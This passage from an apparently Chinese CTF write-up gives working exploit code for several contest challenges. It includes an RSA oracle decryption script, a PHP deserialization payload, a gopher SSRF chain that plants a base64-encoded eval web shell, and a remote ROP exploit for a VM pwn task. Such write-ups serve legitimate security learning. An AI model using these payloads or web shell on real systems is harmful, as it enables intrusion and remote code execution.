</span></span><span class=line><span class=cl>    <span class=s2>&#34;public_n&#34;</span><span class=p>:</span> <span class=s2>&#34;8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;public_e&#34;</span><span class=p>:</span> <span class=s2>&#34;010001&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mh>0x10001</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>cookies</span><span class=p>[</span><span class=s2>&#34;encrypto_flag&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>cookies</span><span class=p>[</span><span class=s2>&#34;public_n&#34;</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://106.14.66.189/abi.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>oracle</span><span class=p>(</span><span class=n>c</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;this[is.able&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>)[</span><span class=s2>&#34;num&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>low</span><span class=p>,</span> <span class=n>high</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>C</span> <span class=o>=</span> <span class=n>c</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>low</span> <span class=o>&lt;</span> <span class=n>high</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>C</span> <span class=o>=</span> <span class=n>C</span><span class=o>*</span><span class=n>t</span> <span class=o>%</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>oracle</span><span class=p>(</span><span class=n>C</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>interval</span> <span class=o>=</span> <span class=p>(</span><span class=n>high</span> <span class=o>-</span> <span class=n>low</span><span class=p>)</span> <span class=o>//</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>high</span> <span class=o>=</span> <span class=n>high</span> <span class=o>-</span> <span class=mi>2</span><span class=o>*</span><span class=n>interval</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>res</span> <span class=o>==</span> <span class=mi>2</span><span class=o>*</span><span class=n>n</span> <span class=o>%</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>low</span><span class=p>,</span> <span class=n>high</span> <span class=o>=</span> <span class=n>low</span> <span class=o>+</span> <span class=n>interval</span><span class=p>,</span> <span class=n>high</span> <span class=o>-</span> <span class=n>interval</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>res</span> <span class=o>==</span> <span class=n>n</span> <span class=o>%</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>low</span> <span class=o>=</span> <span class=n>low</span> <span class=o>+</span> <span class=mi>2</span><span class=o>*</span><span class=n>interval</span> 
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>,</span> <span class=n>low</span><span class=p>,</span> <span class=n>high</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>diff</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=o>-</span><span class=mi>500</span><span class=p>,</span> <span class=mi>500</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>pow</span><span class=p>(</span><span class=n>low</span><span class=o>+</span><span class=n>diff</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>==</span> <span class=n>c</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>low</span> <span class=o>+</span> <span class=n>diff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg alt></p><h3 id=half_infiltration>half_infiltration</h3><p>http://39.98.131.124/</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>view-source:http://39.98.131.124/?x=a:2:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}}
</span></span></code></pre></td></tr></table></div></div><p>通过<code>$this</code>让 php 产生 fatal error 打破 <code>obstart</code> 得到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=c1>//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$url</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=k>false</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag|var|apache|conf|proc|log/i&#34;</span> <span class=p>,</span><span class=nv>$url</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span> 
</span></span><span class=line><span class=cl>            <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>            <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HEADER</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     <span class=p>}</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$header</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>POST / HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s>Host: 127.0.0.1
</span></span></span><span class=line><span class=cl><span class=s>User-Agent: curl/7.64.1
</span></span></span><span class=line><span class=cl><span class=s>Accept: */*
</span></span></span><span class=line><span class=cl><span class=s>Content-Length: 0
</span></span></span><span class=line><span class=cl><span class=s>Connection: close
</span></span></span><span class=line><span class=cl><span class=s>Cookie: PHPSESSID=20vmv3q3hgn1ti6497q4927gk0
</span></span></span><span class=line><span class=cl><span class=s>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;file=.1.txt&amp;content=1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$length</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$header</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;Content-Length: 0&#34;</span><span class=p>,</span> <span class=s2>&#34;Content-Length: </span><span class=si>$length</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>.=</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=s2>&#34;gopher://127.0.0.1:40000/_&#34;</span> <span class=o>.</span> <span class=p>(</span><span class=nx>urlencode</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;+&#34;</span><span class=p>,</span> <span class=s2>&#34; &#34;</span><span class=p>,</span> <span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;curl -vv http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=</span><span class=si>$payload</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>content 貌似是对 &lt;? php = 有关键字过滤，含有这些的就会被 404 ，猜测是用了<code>file_put_contents</code>，并且它支持 php 伪协议写文件，所以可以尝试用 base64 进行绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_payload</span><span class=p>(</span><span class=nv>$session</span><span class=p>,</span> <span class=nv>$filename</span><span class=p>,</span> <span class=nv>$content</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$header</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>POST / HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s>Host: 127.0.0.1
</span></span></span><span class=line><span class=cl><span class=s>User-Agent: curl/7.64.1
</span></span></span><span class=line><span class=cl><span class=s>Accept: */*
</span></span></span><span class=line><span class=cl><span class=s>Content-Length: 0
</span></span></span><span class=line><span class=cl><span class=s>Connection: close
</span></span></span><span class=line><span class=cl><span class=s>Cookie: PHPSESSID=$session
</span></span></span><span class=line><span class=cl><span class=s>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;file=&#34;</span> <span class=o>.</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;&amp;content=&#34;</span> <span class=o>.</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$length</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$header</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;Content-Length: 0&#34;</span><span class=p>,</span> <span class=s2>&#34;Content-Length: </span><span class=si>$length</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>.=</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=s2>&#34;gopher://127.0.0.1:40000/_&#34;</span> <span class=o>.</span> <span class=p>(</span><span class=nx>urlencode</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;+&#34;</span><span class=p>,</span> <span class=s2>&#34; &#34;</span><span class=p>,</span> <span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$payload</span> <span class=o>=</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$content1</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>PD89IGV2YWwoJF9HRVRbY21kXSk7
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>get_payload</span><span class=p>(</span><span class=s2>&#34;test222&#34;</span><span class=p>,</span> <span class=s2>&#34;php://filter/convert.base64-decode/resource=index.php&#34;</span><span class=p>,</span> <span class=nv>$content1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=</span><span class=si>$payload</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn>Pwn</h2><h3 id=qwblogin>qwblogin</h3><p>先逆向过pow,前三个字节直接爆破出来QWQ。之后下断看到是断在了read 0x21的地方。
随便输点东西，跟着后面调试外加看ida的反编译加看官方文档大体可以看出来是将输入的东西分为4组，每组8字节，分别跟一些固定的数字xor，随后cmp对比。
逆向下来是这样的字符串</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;G00DR3VR&#39;+&#39;W31LD0N3&#39;+&#39;Try2Pwn!&#39;+&#39;GOGOGOGO&#39;
</span></span></code></pre></td></tr></table></div></div><p>之后会再进入一个read流程，下断可以看出来是read 0 stack 0x800。stack为程序虚拟的栈空间。
跟c类似的是，这个存在栈溢出。所以最后类似这种形式 0x100*&lsquo;a&rsquo;+p64(rbp)+p64(ret_addr)
再调用ret。很明显一个基于vm的栈溢出（指溢出vm的栈跳vm的code
然后回check这个偏移不大于0x1000，也就是跳不出code区，只能用程序原本就带的code来执行。我们写入不了opcode。
因为是类c的写法，所以找gadget也可以参考c的pop ret的方法。去搜索0x11(ret)。
人肉识别下来是有了syscall的所有调用//0x8 0x9 0xa
以及能控制所有的syscall所需要的参数。//a1[0] a1[1] a1[2] a1[3]
之后用程序自带的orw功能去搞就行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=n>chr</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>chr</span><span class=p>(</span><span class=mh>0x57</span><span class=p>)</span><span class=o>+</span><span class=n>chr</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gd</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#r=process(&#39;sh&#39;,&#39;./launch.sh&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#r=process([&#39;./emulator&#39;,&#39;./test.bin&#39;])</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;47.94.20.173&#39;</span><span class=p>,</span><span class=mi>32142</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;password:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#gd(&#39;b *$rebase(0x1272)&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;G00DR3VR&#39;</span><span class=o>+</span><span class=s1>&#39;W31LD0N3&#39;</span><span class=o>+</span><span class=s1>&#39;Try2Pwn!&#39;</span><span class=o>+</span><span class=s1>&#39;GOGOGOGO&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#gd()</span>
</span></span><span class=line><span class=cl><span class=n>syscall9</span><span class=o>=</span><span class=mh>0x617</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span><span class=o>=</span><span class=mh>0x5b0</span><span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>sy</span><span class=o>=</span><span class=mh>0x6ed</span>
</span></span><span class=line><span class=cl><span class=n>p0r</span><span class=o>=</span><span class=mh>0x2f5</span>
</span></span><span class=line><span class=cl><span class=n>p1r</span><span class=o>=</span><span class=mh>0x377</span>
</span></span><span class=line><span class=cl><span class=n>p2r</span><span class=o>=</span><span class=mh>0x45c</span>
</span></span><span class=line><span class=cl><span class=n>p3r</span><span class=o>=</span><span class=mh>0x4e1</span>
</span></span><span class=line><span class=cl><span class=c1>#gd(&#39;b read&#39;)p64(p0r)+p64(2)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x108</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=n>p0r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p1r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p2r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p3r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p0r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p1r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p2r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>sy</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p0r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p1r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p2r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x200</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p3r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p0r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p1r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p2r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x1ff</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>p3r</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s1>&#39;./flag&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=direct>direct</h3><p>负数溢出，在edit的时候，offset可以为负数，这种情况下可以去修改chunk的size以及向上修改很长的区域。
但没有leak函数。打stdout因为没有任何跟io有关的操作也实现不了。
在readdir那边的操作时候，可以先readdir完随后通过修改size分配unsorted bin去写入libc地址，然后给下一个将被readdir给读取出来的字符串连起来。
